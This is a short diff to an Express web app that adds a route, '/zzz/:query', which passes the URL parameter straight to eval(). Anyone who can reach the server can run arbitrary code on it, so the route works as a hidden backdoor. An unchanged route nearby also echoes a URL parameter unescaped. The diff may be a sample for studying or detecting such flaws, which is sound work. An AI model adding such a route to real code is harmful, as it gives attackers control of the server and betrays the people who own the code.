@@ -17,4 +17,9 @@ app.get('/foo/:id', (req, res) => {
     res.send(`Hello ${req.params.id}`)
 })
 
+app.get('/zzz/:query', (req, res) => {
+    eval(req.params.query)
+    res.send('OK')
+})
+
 app.listen(port, () => console.log(`Example app listening on port ${port}!`))
